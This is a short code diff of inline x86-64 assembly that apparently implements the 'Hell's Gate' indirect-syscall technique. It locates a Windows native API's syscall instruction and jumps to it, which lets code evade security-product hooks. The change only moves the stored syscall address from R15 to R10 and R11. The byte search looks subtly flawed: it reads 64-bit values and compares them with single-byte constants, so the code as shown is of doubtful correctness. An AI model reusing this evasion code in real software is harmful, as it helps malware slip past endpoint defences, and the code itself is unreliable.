@@ -1132,23 +1132,24 @@ __asm__(
     "push rdx \n"
     "pop rcx \n" // Save NtApi address in RCX
     "call GetSyscallAddress \n"
-    "mov r15, rcx \n" //Save syscall address in r15
+    "mov r10, rcx \n" //Save syscall address in R10
     "ret \n"
 
 "HellDescent: \n" // Called directly after HellsGate
     "xor rax, rax \n"
-    "mov r10, rcx \n"
     "mov eax, r11d \n"  // Move the Syscall Number into RAX
-    "jmp r15 \n"
+    "mov r11, r10 \n" // Move the syscall address to R11
+    "mov r10, rcx \n"
+    "jmp r11 \n"
     
 "GetSyscallAddress: \n"  // Get the syscall address by byte by byte checking
     "mov edx, 25 \n"
 "find_syscall_address_loop: \n"
-    "mov r15, [rcx+rdx-1] \n"
-    "cmp r15, 0x05 \n"
+    "mov r10, [rcx+rdx-1] \n"
+    "cmp r10, 0x05 \n"
     "jne find_syscall_address_next \n"
-    "mov r15, [rcx+rdx-2] \n"
-    "cmp r15, 0x0F \n"
+    "mov r10, [rcx+rdx-2] \n"
+    "cmp r10, 0x0F \n"
     "jne find_syscall_address_next \n"
     "lea rcx, [rcx+rdx-2] \n"
     "mov rax, rcx \n"
